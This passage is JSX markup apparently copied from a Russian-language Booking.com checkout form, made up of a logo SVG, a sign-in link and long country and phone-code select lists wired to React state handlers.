                                                            d="M208.6 87.4299C208.654 87.8022 208.62 88.1818 208.501 88.5387C208.382 88.8956 208.182 89.2198 207.916 89.4858C207.65 89.7517 207.326 89.952 206.969 90.0708C206.612 90.1895 206.232 90.2235 205.86 90.1699H146.86C147.923 95.0897 150.538 99.538 154.32 102.86C158.04 106.06 162.76 107.66 168.48 107.66C176.247 107.66 182.187 104.46 186.3 98.0599C186.99 97.0599 188.07 96.8599 189.56 97.5399L204.31 103.72C206.01 104.28 206.42 105.31 205.5 106.8C197.16 120.86 184.827 127.89 168.5 127.89C156.147 127.89 145.653 123.777 137.02 115.55C128.387 107.323 124.07 96.8066 124.07 83.9999C124.07 71.1999 128.357 60.6833 136.93 52.4499C140.918 48.4837 145.655 45.3501 150.866 43.2316C156.076 41.1131 161.656 40.052 167.28 40.1099C180.2 40.1099 190.317 44.0832 197.63 52.0299C204.943 59.9766 208.61 69.9466 208.63 81.9399L208.6 87.4299ZM180.15 63.5099C176.409 60.8135 171.891 59.4093 167.28 59.5099C162.764 59.3452 158.324 60.7009 154.67 63.3599C151.317 65.9086 148.785 69.3857 147.39 73.3599H186.82C185.937 69.3451 183.55 65.8206 180.15 63.5099Z"
                                                            fill="#004CB8"></path>
                                                        <path
                                                            d="M114.67 108.44C114.671 109.243 114.491 110.037 114.145 110.762C113.799 111.487 113.295 112.125 112.67 112.63C100.004 122.585 84.3397 127.956 68.23 127.87C30.57 127.87 0 99.4599 0 64.4699C0 29.4799 30.57 0.129904 68.24 0.129904C84.3159 0.0447155 99.9448 5.41771 112.57 15.3699C112.853 15.5863 113.087 15.8588 113.259 16.1703C113.431 16.4818 113.537 16.8256 113.57 17.1799C113.611 17.5366 113.579 17.8979 113.476 18.2417C113.373 18.5856 113.201 18.9049 112.97 19.1799C109.97 22.8299 103.59 30.4399 100.46 34.1799C100.235 34.4673 99.9522 34.7046 99.6303 34.8767C99.3083 35.0489 98.954 35.1521 98.59 35.1799C98.2309 35.2111 97.8691 35.1706 97.5257 35.0607C97.1824 34.9508 96.8643 34.7738 96.59 34.5399C88.6472 27.8857 78.6017 24.2643 68.24 24.3199C44.93 24.3199 26 42.8299 26 64.4699C26 86.1099 44.9 103.7 68.21 103.7C76.8383 103.736 85.2888 101.247 92.52 96.5399V78.9999H72.52C71.7995 79.0018 71.1069 78.7218 70.59 78.2199C70.0903 77.7048 69.8076 77.0175 69.8 76.2999V59.2999C69.8055 58.5819 70.0886 57.8939 70.59 57.3799C71.111 56.883 71.8002 56.6009 72.52 56.5899H112C112.719 56.5925 113.408 56.8786 113.917 57.3859C114.426 57.8933 114.715 58.5811 114.72 59.2999L114.67 108.44Z"
                                                            fill="#004CB8"></path>
                                                        <path
                                                            d="M320.71 42.1499H312.07C311.343 42.1499 310.646 42.4386 310.133 42.9524C309.619 43.4663 309.33 44.1632 309.33 44.8899V123.11C309.33 123.837 309.619 124.534 310.133 125.047C310.646 125.561 311.343 125.85 312.07 125.85H330.59C330.95 125.851 331.307 125.781 331.64 125.644C331.973 125.507 332.276 125.305 332.53 125.05C332.785 124.796 332.987 124.493 333.124 124.16C333.261 123.827 333.331 123.47 333.33 123.11V54.8799C333.33 46.2999 329.22 42.1499 320.71 42.1499Z"
                                                            fill="#004CB8"></path>
                                                    </g>
                                                    <defs>
                                                        <clipPath id="clip0-2497">
                                                            <rect width="502.78" height="127.89"
                                                                  fill="white"></rect>
                                                        </clipPath>
                                                    </defs>
                                                </svg>
                                            </div>
                                            Получите <b>скидку</b> на бронирование&nbsp;— просто
                                            <button id="ge_existing_email_popover_genius__button"
                                                    className="bui-link" data-command="show-auth-lightbox"
                                                    data-command-params="tab=signin;extraClass=user-access-menu-lightbox--user-center;redirect_uri=https%3A%2F%2Faccount.booking.com%2Fauth%2Foauth2%3Fdt%3D1714392523%26prompt%3Dsignin%26aid%3D304142%26response_type%3Dsso%26lang%3Dru%26redirect_uri%3Dhttps%253A%252F%252Fsecure.booking.com%252Flogin.html%253Fop%253Doauth_return%26iframe%3D1%26client_id%3DvO1Kblk7xX9tUn2cpZLS%26bkng_action%3Dbook%26state%3DUukDzqFZGsjDQ13MkHktgFk5AYQtal_LlR1MeH_CHW9WXxD_iWbll9glFk-KOh7aFV4MOxoClFneMl8bSN4l_c1PlKYbeuE5lU8HJVn6qeFRUP37n2dVPQAzARggtkdc3RCfmsBrtSC6qqIKrHVjAwdigsZE43uxMWMJrw6bjyWCdMyZPjGgRYRwuHwT7LW5pzf_johP1XgWsKy6R3UYGMeq2Md5xdVXXzxJfD1Q_Qd023xtZR1dDspZjsBoxsvsr0QB5gRzWYBuJiBJSGQr4G2G-nhFdx8OIe-bfcCNNolNSrwjD4fxZoZE7nkcB3EsyE6mDf-FFj4opkOiaDCN-gTitX9UXRoBOGlupxz8JHB27N73wgll3cXtO4dX-knch9SVDB9nTFZh_knhCm8nAWbVgyrxUbSZPLT_D1uBZzxVXSFcbt1AZhvRCpqhm9T0HeXT5pks9Atcr7N1bz445EPvOXDlhKns8IjohZEyLYI3XLMksDMtWmQD0XrV84WSeEL5qBhDDgQZkje5S6CQggRczvePxRg5dTQVASQpfjFr-bvRFwFL1VXKD9T51e3v2USt7Y9xJMNwdMA5n1nYhG1qOP6lTVPS9RrkpLZSBacyRbR15tKuaIffntlRrOcEgHI3iOKShjRG3py5">
                                                войдите в аккаунт
                                            </button>
                                        </div>
                                    </div>
                                    <div
                                        className="bui-text--variant-body_2 bui-text--color-neutral_alt bui-u-padding-top--4"
                                        bis_skin_checked="1">
                                        На этот адрес будет отправлено подтверждение бронирования
                                    </div>

                                </div>
                            </div>
                            <div className="bui-u-hidden@small bui-grid__column-4@medium bui-grid__column-6@large"
                                 bis_skin_checked="1">
                            </div>
                            <div className="bui-grid__column bui-grid__column-6@large bui-grid__column-8@medium"
                                 bis_skin_checked="1">
                                <div className="bui-grid js-bp-billing-details__container bui-grid--size-small"
                                     data-component="bp/billing-details-form/address-details" bis_skin_checked="1">
                                    <div className="bui-grid__column" bis_skin_checked="1">
                                        <div data-component="bp/billing-details-form/country" className="
bp_form__field bp_form__field--country
" bis_skin_checked="1">
                                            <p className="bp_form__field__msg" data-bp-form-field-msg=""
                                               id="bp_form_address_country_msg" role="alert">
                                            </p>
                                            <label htmlFor="cc1" className="bp_form__field__label">
                                                Страна/территория
                                                <abbr className="mandatory-asterisk" title="Обязательно"
                                                      aria-hidden="true"> *</abbr>
                                            </label>
                                            <div className="bp-field-container" bis_skin_checked="1">
                                                <select name="cc1" id="cc1" className="
fixed_width
bp_input_select
bp_form__field__input
" required="" aria-describedby="bp_form_address_country_msg" autoComplete="country"
                                                        onSelect={(e) => setEntity((prevState) => ({
                                                            ...prevState,
                                                            country: e.target.value
                                                        }))}>
                                                    <option value="" disabled="">Выберите страну/территорию</option>
                                                    <option value="xa" data-prefix="">
                                                        Абхазия
                                                    </option>
                                                    <option value="au" data-prefix="">
                                                        Австралия
                                                    </option>
                                                    <option value="at" data-prefix="">
                                                        Австрия
                                                    </option>
                                                    <option value="az" data-prefix="">
                                                        Азербайджан
                                                    </option>
                                                    <option value="al" data-prefix="">
                                                        Албания
                                                    </option>
                                                    <option value="dz" data-prefix="">
                                                        Алжир
                                                    </option>
                                                    <option value="vi" data-prefix="">
                                                        Американские Виргинские острова
                                                    </option>
                                                    <option value="as" data-prefix="">
                                                        Американское Самоа
                                                    </option>
                                                    <option value="ai" data-prefix="">
                                                        Ангилья
                                                    </option>
                                                    <option value="ao" data-prefix="">
                                                        Ангола
                                                    </option>
                                                    <option value="ad" data-prefix="">
                                                        Андорра
                                                    </option>
                                                    <option value="aq" data-prefix="">
                                                        Антарктида
                                                    </option>
                                                    <option value="ag" data-prefix="">
                                                        Антигуа и Барбуда
                                                    </option>
                                                    <option value="ar" data-prefix="">
                                                        Аргентина
                                                    </option>
                                                    <option value="am" data-prefix="">
                                                        Армения
                                                    </option>
                                                    <option value="aw" data-prefix="">
                                                        Аруба
                                                    </option>
                                                    <option value="af" data-prefix="">
                                                        Афганистан
                                                    </option>
                                                    <option value="bs" data-prefix="">
                                                        Багамcкие острова
                                                    </option>
                                                    <option value="bd" data-prefix="">
                                                        Бангладеш
                                                    </option>
                                                    <option value="bb" data-prefix="">
                                                        Барбадос
                                                    </option>
                                                    <option value="bh" data-prefix="">
                                                        Бахрейн
                                                    </option>
                                                    <option value="by" data-prefix="">
                                                        Беларусь
                                                    </option>
                                                    <option value="bz" data-prefix="">
                                                        Белиз
                                                    </option>
                                                    <option value="be" data-prefix="">
                                                        Бельгия
                                                    </option>
                                                    <option value="bj" data-prefix="">
                                                        Бенин
                                                    </option>
                                                    <option value="bm" data-prefix="">
                                                        Бермудские острова
                                                    </option>
                                                    <option value="bg" data-prefix="">
                                                        Болгария
                                                    </option>
                                                    <option value="bo" data-prefix="">
                                                        Боливия
                                                    </option>
                                                    <option value="bq" data-prefix="">
                                                        Бонэйр, Синт-Эстатиус и Саба
                                                    </option>
                                                    <option value="ba" data-prefix="">
                                                        Босния и Герцеговина
                                                    </option>
                                                    <option value="bw" data-prefix="">
                                                        Ботсвана
                                                    </option>
                                                    <option value="br" data-prefix="">
                                                        Бразилия
                                                    </option>
                                                    <option value="io" data-prefix="">
                                                        Британская Территория в Индийском океане
                                                    </option>
                                                    <option value="vg" data-prefix="">
                                                        Британские Виргинские острова
                                                    </option>
                                                    <option value="bn" data-prefix="">
                                                        Бруней
                                                    </option>
                                                    <option value="bf" data-prefix="">
                                                        Буркина-Фасо
                                                    </option>
                                                    <option value="bi" data-prefix="">
                                                        Бурунди
                                                    </option>
                                                    <option value="bt" data-prefix="">
                                                        Бутан
                                                    </option>
                                                    <option value="vu" data-prefix="">
                                                        Вануату
                                                    </option>
                                                    <option value="va" data-prefix="">
                                                        Ватикан
                                                    </option>
                                                    <option value="gb" data-prefix="">
                                                        Великобритания
                                                    </option>
                                                    <option value="hu" data-prefix="">
                                                        Венгрия
                                                    </option>
                                                    <option value="ve" data-prefix="">
                                                        Венесуэла
                                                    </option>
                                                    <option value="um" data-prefix="">
                                                        Внешние малые острова США
                                                    </option>
                                                    <option value="tl" data-prefix="">
                                                        Восточный Тимор
                                                    </option>
                                                    <option value="vn" data-prefix="">
                                                        Вьетнам
                                                    </option>
                                                    <option value="ga" data-prefix="">
                                                        Габон
                                                    </option>
                                                    <option value="ht" data-prefix="">
                                                        Гаити
                                                    </option>
                                                    <option value="gy" data-prefix="">
                                                        Гайана
                                                    </option>
                                                    <option value="gm" data-prefix="">
                                                        Гамбия
                                                    </option>
                                                    <option value="gh" data-prefix="">
                                                        Гана
                                                    </option>
                                                    <option value="gp" data-prefix="">
                                                        Гваделупа
                                                    </option>
                                                    <option value="gt" data-prefix="">
                                                        Гватемала
                                                    </option>
                                                    <option value="gn" data-prefix="">
                                                        Гвинея
                                                    </option>
                                                    <option value="gw" data-prefix="">
                                                        Гвинея-Бисау
                                                    </option>
                                                    <option value="de" data-prefix="">
                                                        Германия
                                                    </option>
                                                    <option value="gi" data-prefix="">
                                                        Гибралтар
                                                    </option>
                                                    <option value="hn" data-prefix="">
                                                        Гондурас
                                                    </option>
                                                    <option value="hk" data-prefix="">
                                                        Гонконг
                                                    </option>
                                                    <option value="gd" data-prefix="">
                                                        Гренада
                                                    </option>
                                                    <option value="gl" data-prefix="">
                                                        Гренландия
                                                    </option>
                                                    <option value="gr" data-prefix="">
                                                        Греция
                                                    </option>
                                                    <option value="ge" data-prefix="">
                                                        Грузия
                                                    </option>
                                                    <option value="gu" data-prefix="">
                                                        Гуам
                                                    </option>
                                                    <option value="dk" data-prefix="">
                                                        Дания
                                                    </option>
                                                    <option value="cd" data-prefix="">
                                                        Демократическая Республика Конго
                                                    </option>
                                                    <option value="dj" data-prefix="">
                                                        Джибути
                                                    </option>
                                                    <option value="dm" data-prefix="">
                                                        Доминика
                                                    </option>
                                                    <option value="do" data-prefix="">
                                                        Доминиканская Республика
                                                    </option>
                                                    <option value="eg" data-prefix="">
                                                        Египет
                                                    </option>
                                                    <option value="zm" data-prefix="">
                                                        Замбия
                                                    </option>
                                                    <option value="zw" data-prefix="">
                                                        Зимбабве
                                                    </option>
                                                    <option value="il" data-prefix="">
                                                        Израиль
                                                    </option>
                                                    <option value="in" data-prefix="">
                                                        Индия
                                                    </option>
                                                    <option value="id" data-prefix="">
                                                        Индонезия
                                                    </option>
                                                    <option value="jo" data-prefix="">
                                                        Иордания
                                                    </option>
                                                    <option value="iq" data-prefix="">
                                                        Ирак
                                                    </option>
                                                    <option value="ir" data-prefix="">
                                                        Иран
                                                    </option>
                                                    <option value="ie" data-prefix="">
                                                        Ирландия
                                                    </option>
                                                    <option value="is" data-prefix="">
                                                        Исландия
                                                    </option>
                                                    <option value="es" data-prefix="">
                                                        Испания
                                                    </option>
                                                    <option value="it" data-prefix="">
                                                        Италия
                                                    </option>
                                                    <option value="ye" data-prefix="">
                                                        Йемен
                                                    </option>
                                                    <option value="cv" data-prefix="">
                                                        Кабо-Верде
                                                    </option>
                                                    <option value="kz" data-prefix="">
                                                        Казахстан
                                                    </option>
                                                    <option value="ky" data-prefix="">
                                                        Каймановы острова
                                                    </option>
                                                    <option value="kh" data-prefix="">
                                                        Камбоджа
                                                    </option>
                                                    <option value="cm" data-prefix="">
                                                        Камерун
                                                    </option>
                                                    <option value="ca" data-prefix="">
                                                        Канада
                                                    </option>
                                                    <option value="qa" data-prefix="">
                                                        Катар
                                                    </option>
                                                    <option value="ke" data-prefix="">
                                                        Кения
                                                    </option>
                                                    <option value="cy" data-prefix="">
                                                        Кипр
                                                    </option>
                                                    <option value="kg" data-prefix="">
                                                        Киргизия
                                                    </option>
                                                    <option value="ki" data-prefix="">
                                                        Кирибати
                                                    </option>
                                                    <option value="cn" data-prefix="">
                                                        Китай
                                                    </option>
                                                    <option value="cc" data-prefix="">
                                                        Кокосовые острова (острова Килинг)
                                                    </option>
                                                    <option value="co" data-prefix="">
                                                        Колумбия
                                                    </option>
                                                    <option value="km" data-prefix="">
                                                        Коморские острова
                                                    </option>
                                                    <option value="cg" data-prefix="">
                                                        Конго
                                                    </option>
                                                    <option value="xk" data-prefix="">
                                                        Косово
                                                    </option>
                                                    <option value="cr" data-prefix="">
                                                        Коста-Рика
                                                    </option>
                                                    <option value="ci" data-prefix="">
                                                        Кот-д'Ивуар
                                                    </option>
                                                    <option value="xc" data-prefix="">
                                                        Крым
                                                    </option>
                                                    <option value="kw" data-prefix="">
                                                        Кувейт
                                                    </option>
                                                    <option value="cw" data-prefix="">
                                                        Кюрасао
                                                    </option>
                                                    <option value="la" data-prefix="">
                                                        Лаос
                                                    </option>
                                                    <option value="lv" data-prefix="">
                                                        Латвия
                                                    </option>
                                                    <option value="ls" data-prefix="">
                                                        Лесото
                                                    </option>
                                                    <option value="lr" data-prefix="">
                                                        Либерия
                                                    </option>
                                                    <option value="lb" data-prefix="">
                                                        Ливан
                                                    </option>
                                                    <option value="ly" data-prefix="">
                                                        Ливия
                                                    </option>
                                                    <option value="lt" data-prefix="">
                                                        Литва
                                                    </option>
                                                    <option value="li" data-prefix="">
                                                        Лихтенштейн
                                                    </option>
                                                    <option value="lu" data-prefix="">
                                                        Люксембург
                                                    </option>
                                                    <option value="mu" data-prefix="">
                                                        Маврикий
                                                    </option>
                                                    <option value="mr" data-prefix="">
                                                        Мавритания
                                                    </option>
                                                    <option value="mg" data-prefix="">
                                                        Мадагаскар
                                                    </option>
                                                    <option value="yt" data-prefix="">
                                                        Майотта
                                                    </option>
                                                    <option value="mo" data-prefix="">
                                                        Макао
                                                    </option>
                                                    <option value="mw" data-prefix="">
                                                        Малави
                                                    </option>
                                                    <option value="my" data-prefix="">
                                                        Малайзия
                                                    </option>
                                                    <option value="ml" data-prefix="">
                                                        Мали
                                                    </option>
                                                    <option value="mv" data-prefix="">
                                                        Мальдивы
                                                    </option>
                                                    <option value="mt" data-prefix="">
                                                        Мальта
                                                    </option>
                                                    <option value="ma" data-prefix="">
                                                        Марокко
                                                    </option>
                                                    <option value="mq" data-prefix="">
                                                        Мартиника
                                                    </option>
                                                    <option value="mh" data-prefix="">
                                                        Маршалловы острова
                                                    </option>
                                                    <option value="mx" data-prefix="">
                                                        Мексика
                                                    </option>
                                                    <option value="fm" data-prefix="">
                                                        Микронезия
                                                    </option>
                                                    <option value="mz" data-prefix="">
                                                        Мозамбик
                                                    </option>
                                                    <option value="md" data-prefix="">
                                                        Молдова
                                                    </option>
                                                    <option value="mc" data-prefix="">
                                                        Монако
                                                    </option>
                                                    <option value="mn" data-prefix="">
                                                        Монголия
                                                    </option>
                                                    <option value="ms" data-prefix="">
                                                        Монтсеррат
                                                    </option>
                                                    <option value="mm" data-prefix="">
                                                        Мьянма
                                                    </option>
                                                    <option value="na" data-prefix="">
                                                        Намибия
                                                    </option>
                                                    <option value="nr" data-prefix="">
                                                        Науру
                                                    </option>
                                                    <option value="np" data-prefix="">
                                                        Непал
                                                    </option>
                                                    <option value="ne" data-prefix="">
                                                        Нигер
                                                    </option>
                                                    <option value="ng" data-prefix="">
                                                        Нигерия
                                                    </option>
                                                    <option value="nl" data-prefix="">
                                                        Нидерланды
                                                    </option>
                                                    <option value="ni" data-prefix="">
                                                        Никарагуа
                                                    </option>
                                                    <option value="nu" data-prefix="">
                                                        Ниуэ
                                                    </option>
                                                    <option value="nz" data-prefix="">
                                                        Новая Зеландия
                                                    </option>
                                                    <option value="nc" data-prefix="">
                                                        Новая Каледония
                                                    </option>
                                                    <option value="no" data-prefix="">
                                                        Норвегия
                                                    </option>
                                                    <option value="ae" data-prefix="">
                                                        ОАЭ
                                                    </option>
                                                    <option value="tz" data-prefix="">
                                                        Объединенная Республика Танзания
                                                    </option>
                                                    <option value="om" data-prefix="">
                                                        Оман
                                                    </option>
                                                    <option value="ck" data-prefix="">
                                                        Острова Кука
                                                    </option>
                                                    <option value="pk" data-prefix="">
                                                        Пакистан
                                                    </option>
                                                    <option value="pw" data-prefix="">
                                                        Палау
                                                    </option>
                                                    <option value="ps" data-prefix="">
                                                        Палестинская Территория
                                                    </option>
                                                    <option value="pa" data-prefix="">
                                                        Панама
                                                    </option>
                                                    <option value="pg" data-prefix="">
                                                        Папуа-Новая Гвинея
                                                    </option>
                                                    <option value="py" data-prefix="">
                                                        Парагвай
                                                    </option>
                                                    <option value="pe" data-prefix="">
                                                        Перу
                                                    </option>
                                                    <option value="pl" data-prefix="">
                                                        Польша
                                                    </option>
                                                    <option value="pt" data-prefix="">
                                                        Португалия
                                                    </option>
                                                    <option value="pr" data-prefix="">
                                                        Пуэрто-Рико
                                                    </option>
                                                    <option value="re" data-prefix="">
                                                        Реюньон
                                                    </option>
                                                    <option value="ru" data-prefix="">
                                                        Россия
                                                    </option>
                                                    <option value="rw" data-prefix="">
                                                        Руанда
                                                    </option>
                                                    <option value="ro" data-prefix="">
                                                        Румыния
                                                    </option>
                                                    <option value="us" data-prefix="">
                                                        США
                                                    </option>
                                                    <option value="sv" data-prefix="">
                                                        Сальвадор
                                                    </option>
                                                    <option value="ws" data-prefix="">
                                                        Самоа
                                                    </option>
                                                    <option value="sm" data-prefix="">
                                                        Сан-Марино
                                                    </option>
                                                    <option value="st" data-prefix="">
                                                        Сан-Томе и Принсипи
                                                    </option>
                                                    <option value="sa" data-prefix="">
                                                        Саудовская Аравия
                                                    </option>
                                                    <option value="kp" data-prefix="">
                                                        Северная Корея
                                                    </option>
                                                    <option value="mk" data-prefix="">
                                                        Северная Македония
                                                    </option>
                                                    <option value="mp" data-prefix="">
                                                        Северные Марианские острова
                                                    </option>
                                                    <option value="xy" data-prefix="">
                                                        Северный Кипр
                                                    </option>
                                                    <option value="sc" data-prefix="">
                                                        Сейшельские острова
                                                    </option>
                                                    <option value="bl" data-prefix="">
                                                        Сен-Бартелеми
                                                    </option>
                                                    <option value="mf" data-prefix="">
                                                        Сен-Мартен
                                                    </option>
                                                    <option value="pm" data-prefix="">
                                                        Сен-Пьер и Микелон
                                                    </option>
                                                    <option value="sn" data-prefix="">
                                                        Сенегал
                                                    </option>
                                                    <option value="vc" data-prefix="">
                                                        Сент-Винсент и Гренадины
                                                    </option>
                                                    <option value="kn" data-prefix="">
                                                        Сент-Киттс и Невис
                                                    </option>
                                                    <option value="lc" data-prefix="">
                                                        Сент-Люсия
                                                    </option>
                                                    <option value="rs" data-prefix="">
                                                        Сербия
                                                    </option>
                                                    <option value="sg" data-prefix="">
                                                        Сингапур
                                                    </option>
                                                    <option value="sx" data-prefix="">
                                                        Синт-Мартен
                                                    </option>
                                                    <option value="sy" data-prefix="">
                                                        Сирийская Арабская Республика
                                                    </option>
                                                    <option value="sk" data-prefix="">
                                                        Словакия
                                                    </option>
                                                    <option value="si" data-prefix="">
                                                        Словения
                                                    </option>
                                                    <option value="sb" data-prefix="">
                                                        Соломоновы острова
                                                    </option>
                                                    <option value="so" data-prefix="">
                                                        Сомали
                                                    </option>
                                                    <option value="sd" data-prefix="">
                                                        Судан
                                                    </option>
                                                    <option value="sr" data-prefix="">
                                                        Суринам
                                                    </option>
                                                    <option value="sl" data-prefix="">
                                                        Сьерра-Леоне
                                                    </option>
                                                    <option value="tj" data-prefix="">
                                                        Таджикистан
                                                    </option>
                                                    <option value="th" data-prefix="">
                                                        Таиланд
                                                    </option>
                                                    <option value="tw" data-prefix="">
                                                        Тайвань
                                                    </option>
                                                    <option value="tg" data-prefix="">
                                                        Того
                                                    </option>
                                                    <option value="tk" data-prefix="">
                                                        Токелау
                                                    </option>
                                                    <option value="to" data-prefix="">
                                                        Тонга
                                                    </option>
                                                    <option value="tt" data-prefix="">
                                                        Тринидад и Тобаго
                                                    </option>
                                                    <option value="tv" data-prefix="">
                                                        Тувалу
                                                    </option>
                                                    <option value="tn" data-prefix="">
                                                        Тунис
                                                    </option>
                                                    <option value="tm" data-prefix="">
                                                        Туркмения
                                                    </option>
                                                    <option value="tr" data-prefix="">
                                                        Турция
                                                    </option>
                                                    <option value="ug" data-prefix="">
                                                        Уганда
                                                    </option>
                                                    <option value="uz" data-prefix="">
                                                        Узбекистан
                                                    </option>
                                                    <option value="ua" data-prefix="" selected="selected">
                                                        Украина
                                                    </option>
                                                    <option value="uy" data-prefix="">
                                                        Уругвай
                                                    </option>
                                                    <option value="fo" data-prefix="">
                                                        Фарерские острова
                                                    </option>
                                                    <option value="fj" data-prefix="">
                                                        Фиджи
                                                    </option>
                                                    <option value="ph" data-prefix="">
                                                        Филиппины
                                                    </option>
                                                    <option value="fi" data-prefix="">
                                                        Финляндия
                                                    </option>
                                                    <option value="fk" data-prefix="">
                                                        Фолклендские острова
                                                    </option>
                                                    <option value="fr" data-prefix="">
                                                        Франция
                                                    </option>
                                                    <option value="gf" data-prefix="">
                                                        Французская Гвиана
                                                    </option>
                                                    <option value="pf" data-prefix="">
                                                        Французская Полинезия
                                                    </option>
                                                    <option value="tf" data-prefix="">
                                                        Французские Южные Территории
                                                    </option>
                                                    <option value="hr" data-prefix="">
                                                        Хорватия
                                                    </option>
                                                    <option value="cf" data-prefix="">
                                                        Центральноафриканская Республика
                                                    </option>
                                                    <option value="td" data-prefix="">
                                                        Чад
                                                    </option>
                                                    <option value="me" data-prefix="">
                                                        Черногория
                                                    </option>
                                                    <option value="cz" data-prefix="">
                                                        Чехия
                                                    </option>
                                                    <option value="cl" data-prefix="">
                                                        Чили
                                                    </option>
                                                    <option value="ch" data-prefix="">
                                                        Швейцария
                                                    </option>
                                                    <option value="se" data-prefix="">
                                                        Швеция
                                                    </option>
                                                    <option value="lk" data-prefix="">
                                                        Шри-Ланка
                                                    </option>
                                                    <option value="ec" data-prefix="">
                                                        Эквадор
                                                    </option>
                                                    <option value="gq" data-prefix="">
                                                        Экваториальная Гвинея
                                                    </option>
                                                    <option value="er" data-prefix="">
                                                        Эритрея
                                                    </option>
                                                    <option value="sz" data-prefix="">
                                                        Эсватини
                                                    </option>
                                                    <option value="ee" data-prefix="">
                                                        Эстония
                                                    </option>
                                                    <option value="et" data-prefix="">
                                                        Эфиопия
                                                    </option>
                                                    <option value="gs" data-prefix="">
                                                        Южная Георгия и Южные Сандвичевы острова
                                                    </option>
                                                    <option value="kr" data-prefix="">
                                                        Южная Корея
                                                    </option>
                                                    <option value="za" data-prefix="">
                                                        Южно-Африканская Республика
                                                    </option>
                                                    <option value="ss" data-prefix="">
                                                        Южный Судан
                                                    </option>
                                                    <option value="jm" data-prefix="">
                                                        Ямайка
                                                    </option>
                                                    <option value="jp" data-prefix="">
                                                        Япония
                                                    </option>
                                                    <option value="tc" data-prefix="">
                                                        о-ва Теркс и Кайкос
                                                    </option>
                                                    <option value="hm" data-prefix="">
                                                        о-ва Херд и Макдональд
                                                    </option>
                                                    <option value="bv" data-prefix="">
                                                        остров Буве
                                                    </option>
                                                    <option value="gg" data-prefix="">
                                                        остров Гернси
                                                    </option>
                                                    <option value="je" data-prefix="">
                                                        остров Джерси
                                                    </option>
                                                    <option value="im" data-prefix="">
                                                        остров Мэн
                                                    </option>
                                                    <option value="nf" data-prefix="">
                                                        остров Норфолк
                                                    </option>
                                                    <option value="cx" data-prefix="">
                                                        остров Рождества
                                                    </option>
                                                    <option value="sh" data-prefix="">
                                                        остров Святой Елены
                                                    </option>
                                                    <option value="pn" data-prefix="">
                                                        острова Питкэрн
                                                    </option>
                                                    <option value="wf" data-prefix="">
                                                        острова Уоллис и Футуна
                                                    </option>
                                                    <option value="sj" data-prefix="">
                                                        острова Шпицберген и Ян-Майен
                                                    </option>
                                                </select>
                                            </div>
                                        </div>
                                    </div>
                                    <div className="bui-grid__column" bis_skin_checked="1">
                                        <div data-component="bp/personal-details-form/phone" className="
bp_form__field bp_form__field--phone
" bis_skin_checked="1">
                                            <p className="bp_form__field__msg" data-bp-form-field-msg=""
                                               id="bp_form_phone_msg" role="alert">
                                            </p>
                                            <label htmlFor="phone" className="bp_form__field__label">
                                                Номер телефона (предпочтительно мобильный)
                                                <abbr className="mandatory-asterisk" title="Обязательно"
                                                      aria-hidden="true"> *</abbr>
                                            </label>
                                            <div className="bp-field-container" bis_skin_checked="1">
                                                <div data-component="input-phone-country"
                                                     className="c-input-phone-country" data-phone-country-default="ua"
                                                     bis_skin_checked="1">
                                                    <select className="c-input-phone-country__country" tabIndex="-1"
                                                            data-phone-country=""
                                                            onSelect={(e) => setEntity((prevState) => ({
                                                                ...prevState,
                                                                phoneCountry: e.target.value
                                                            }))}>
                                                        <option value="AU" data-calling-code="61">Австралия +61</option>
                                                        <option value="AT" data-calling-code="43">Австрия +43</option>
                                                        <option value="AZ" data-calling-code="994">Азербайджан +994
                                                        </option>
                                                        <option value="AL" data-calling-code="355">Албания +355</option>
                                                        <option value="DZ" data-calling-code="213">Алжир +213</option>
                                                        <option value="VI" data-calling-code="1340">Американские
                                                            Виргинские острова +1340
                                                        </option>
                                                        <option value="AS" data-calling-code="1684">Американское Самоа
                                                            +1684
                                                        </option>
                                                        <option value="AI" data-calling-code="1264">Ангилья +1264
                                                        </option>
                                                        <option value="AO" data-calling-code="244">Ангола +244</option>
                                                        <option value="AD" data-calling-code="376">Андорра +376</option>
                                                        <option value="AQ" data-calling-code="672">Антарктида +672
                                                        </option>
                                                        <option value="AG" data-calling-code="1268">Антигуа и Барбуда
                                                            +1268
                                                        </option>
                                                        <option value="AR" data-calling-code="54">Аргентина +54</option>
                                                        <option value="AM" data-calling-code="374">Армения +374</option>
                                                        <option value="AW" data-calling-code="297">Аруба +297</option>
                                                        <option value="AF" data-calling-code="93">Афганистан +93
                                                        </option>
                                                        <option value="BS" data-calling-code="1242">Багамcкие острова
                                                            +1242
                                                        </option>
                                                        <option value="BD" data-calling-code="880">Бангладеш +880
                                                        </option>
                                                        <option value="BB" data-calling-code="1246">Барбадос +1246
                                                        </option>
                                                        <option value="BH" data-calling-code="973">Бахрейн +973</option>
                                                        <option value="BY" data-calling-code="375">Беларусь +375
                                                        </option>
                                                        <option value="BZ" data-calling-code="501">Белиз +501</option>
                                                        <option value="BE" data-calling-code="32">Бельгия +32</option>
                                                        <option value="BJ" data-calling-code="229">Бенин +229</option>
                                                        <option value="BM" data-calling-code="1441">Бермудские острова
                                                            +1441
                                                        </option>
                                                        <option value="BG" data-calling-code="359">Болгария +359
                                                        </option>
                                                        <option value="BO" data-calling-code="591">Боливия +591</option>
                                                        <option value="BQ" data-calling-code="599">Бонэйр, Синт-Эстатиус
                                                            и Саба +599
                                                        </option>
                                                        <option value="BA" data-calling-code="387">Босния и Герцеговина
                                                            +387
                                                        </option>
                                                        <option value="BW" data-calling-code="267">Ботсвана +267
                                                        </option>
                                                        <option value="BR" data-calling-code="55">Бразилия +55</option>
                                                        <option value="IO" data-calling-code="246">Британская Территория
                                                            в Индийском … +246
                                                        </option>
                                                        <option value="VG" data-calling-code="1284">Британские
                                                            Виргинские острова +1284
                                                        </option>
                                                        <option value="BN" data-calling-code="673">Бруней +673</option>
                                                        <option value="BF" data-calling-code="226">Буркина-Фасо +226
                                                        </option>
                                                        <option value="BI" data-calling-code="257">Бурунди +257</option>
                                                        <option value="BT" data-calling-code="975">Бутан +975</option>
                                                        <option value="VU" data-calling-code="678">Вануату +678</option>
                                                        <option value="VA" data-calling-code="379">Ватикан +379</option>
                                                        <option value="GB" data-calling-code="44">Великобритания +44
                                                        </option>
                                                        <option value="HU" data-calling-code="36">Венгрия +36</option>
                                                        <option value="VE" data-calling-code="58">Венесуэла +58</option>
                                                        <option value="UM" data-calling-code="1">Внешние малые острова
                                                            США +1
                                                        </option>
                                                        <option value="TL" data-calling-code="670">Восточный Тимор
                                                            +670
                                                        </option>
                                                        <option value="VN" data-calling-code="84">Вьетнам +84</option>
                                                        <option value="GA" data-calling-code="241">Габон +241</option>
                                                        <option value="HT" data-calling-code="509">Гаити +509</option>
